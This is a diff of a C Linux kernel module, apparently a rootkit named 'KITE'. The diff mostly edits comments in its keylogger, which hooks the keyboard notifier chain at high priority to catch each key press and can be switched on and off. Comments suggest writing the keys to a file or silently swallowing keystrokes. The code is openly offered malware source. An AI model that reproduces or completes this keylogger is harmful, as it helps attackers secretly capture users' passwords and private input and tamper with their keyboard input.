@@ -14,21 +14,21 @@ static int log_keys(struct notifier_block *nb, unsigned long action, void * data
 {
     // Can make user "miss" by counting and notifying NOTIFY_STOP every couple of times
 
-    struct keyboard_notifier_param *knd = data;     //<- Get the data for the callback into "knd"
-    if ((action == KBD_KEYSYM) && (knd->down))       //<- Check if the callback happened because a ascii key pressed
+    struct keyboard_notifier_param *knd = data;     // Put the data of the notification into "knd"
+    if ((action == KBD_KEYSYM) && (knd->down))      // Check if the callback happened because an ascii key pressed
     {
 #ifdef KITE_DEBUG
-		pr_info("Pressed key '%c' with value '%d'.\n", knd->value, knd->value);
+		pr_info("Pressed key '%c'.\n", knd->value);
 #endif
     }
 
-    return NOTIFY_OK;
+    return NOTIFY_OK; // Return OK for now, can use NOTIFTY_STOP for interrupting or log to a file before returning
 }
 
 // Declare and Initialize the notifier_block with the callback function
 static struct notifier_block logger_notification_block = {
-        .notifier_call = log_keys,          // Assign the callback function to this notification chain
-        .priority = 100
+        .notifier_call = log_keys,          // Assign the callback function to this notification chain.
+        .priority = 100                     // Set high priority for first getting the notification.
 };
 
 static int switch_key_logging(void){
@@ -39,7 +39,7 @@ static int switch_key_logging(void){
 #ifdef KITE_DEBUG
 		pr_info("Stopping keylogging\n");
 #endif
-        unregister_keyboard_notifier(&logger_notification_block);
+        unregister_keyboard_notifier(&logger_notification_block); // unregister the custom notification block
         KEYLOG_ACTIVE = 0;
     }
     else{
@@ -47,7 +47,7 @@ static int switch_key_logging(void){
 		pr_info("Starting keylogging\n");
 #endif
 
-        register_keyboard_notifier(&logger_notification_block);
+        register_keyboard_notifier(&logger_notification_block); // register the custom notification block
         KEYLOG_ACTIVE = 1;
     }
     return 0;
